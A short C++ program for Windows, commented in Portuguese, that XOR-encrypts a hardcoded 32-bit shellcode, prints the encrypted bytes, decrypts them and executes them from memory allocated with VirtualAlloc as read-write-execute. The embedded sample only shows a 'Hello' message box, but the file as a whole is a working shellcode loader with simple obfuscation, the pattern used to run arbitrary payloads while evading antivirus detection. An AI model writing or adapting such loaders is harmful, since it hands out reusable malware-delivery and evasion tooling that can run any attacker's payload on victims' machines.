#include <windows.h>
#include <iostream>
#include <string>

// Shellcode de exemplo (MessageBoxA "Hello" - 32 bits)
unsigned char shellcode[] =
    "\x6A\x00\x68\x6F\x78\x21\x00\x68\x48\x65\x6C\x6C\x8D\x4C\x24\x04\x51"
    "\x6A\x00\x6A\x00\xB8\xEA\x07\x45\x7E\xFF\xD0"; // MessageBoxA("Hello!")

const int shellcodeSize = sizeof(shellcode) - 1;  // Tamanho real do shellcode
std::string xorKey = "MySecretKey";              // Chave de texto

void xorEncrypt(unsigned char* data, size_t len, const std::string& key) {
    size_t keyLen = key.length();
    for (size_t i = 0; i < len; ++i) {
        data[i] ^= key[i % keyLen];
    }
}

int main() {
    // Copia o shellcode original
    unsigned char encryptedShellcode[shellcodeSize];
    memcpy(encryptedShellcode, shellcode, shellcodeSize);

    // Encripta com chave de texto
    xorEncrypt(encryptedShellcode, shellcodeSize, xorKey);

    std::cout << "[+] Shellcode encriptado (XOR com chave \"MySecretKey\"):\n";
    for (int i = 0; i < shellcodeSize; ++i) {
        printf("\\x%02X", encryptedShellcode[i]);
    }
    std::cout << "\n";

    // Desencripta antes da execução
    xorEncrypt(encryptedShellcode, shellcodeSize, xorKey);

    // Aloca memória e copia o shellcode
    void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, encryptedShellcode, shellcodeSize);

    std::cout << "[+] Executando shellcode...\n";

    // Executa
    ((void(*)())exec)();

    return 0;
}
